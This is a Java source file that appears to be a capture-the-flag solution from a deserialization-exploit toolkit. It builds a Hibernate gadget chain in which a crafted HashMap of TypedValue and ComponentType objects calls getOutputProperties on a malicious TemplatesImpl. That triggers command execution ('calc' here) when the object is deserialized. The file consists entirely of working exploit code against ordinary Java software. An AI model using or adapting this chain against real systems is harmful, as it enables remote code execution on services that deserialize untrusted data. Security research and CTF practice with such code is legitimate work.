package dev.silente.javashark.solution;


import com.mchange.v2.beans.swing.TestBean;
import dev.silente.javashark.gadget.jdk.GHashMap;
import dev.silente.javashark.sink.jdk.STemplates;
import dev.silente.javashark.utils.ReflectUtils;
import dev.silente.javashark.utils.SerializeUtils;
import dev.silente.javashark.utils.TestUtils;
import javassist.ClassPool;
import javassist.CtClass;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;

public class CCB2023Final {


    public static HashMap makeMap (Object v1, Object v2 ) throws Exception{
        HashMap s = new HashMap();
        ReflectUtils.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        ReflectUtils.setFieldValue(s, "table", tbl);
        return s;
    }
    public static Object makeHibernate4Getter ( Class<?> tplClass, String method ) throws ClassNotFoundException, NoSuchMethodException,
            SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("org.hibernate.property.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
        ReflectUtils.setAccessible(bgCon);

        if ( !method.startsWith("get") ) {
            throw new IllegalArgumentException("Hibernate4 can only call getters");
        }

        String propName = Character.toLowerCase(method.charAt(3)) + method.substring(4);

        Object g = bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }
    public static void main(String[] args) throws Exception {
//        Object tpl = new TestUtils();

        Object tpl = STemplates.getEvilTemplates("calc");
//        Object getters = makeHibernate4Getter(tpl.getClass(),"getName");
        Object getters = makeHibernate4Getter(tpl.getClass(),"getOutputProperties");
//        templates.getOutputProperties();
        PojoComponentTuplizer tup = ReflectUtils.createWithoutConstructor(PojoComponentTuplizer.class);
        ReflectUtils.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

        ComponentType t = ReflectUtils.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        ReflectUtils.setFieldValue(t, "componentTuplizer", tup);
        ReflectUtils.setFieldValue(t, "propertySpan", 1);
        ReflectUtils.setFieldValue(t, "propertyTypes", new Type[] {
                t
        });

        TypedValue v1 = new TypedValue(t, null);
        ReflectUtils.setFieldValue(v1, "value", tpl);
        ReflectUtils.setFieldValue(v1, "type", t);

        TypedValue v2 = new TypedValue(t, null);
        ReflectUtils.setFieldValue(v2, "value", tpl);
        ReflectUtils.setFieldValue(v2, "type", t);

        Object mapmap= makeMap(v1, v2);

        byte[] code = SerializeUtils.serialize(mapmap);
        SerializeUtils.deserialize(code);
    }
}
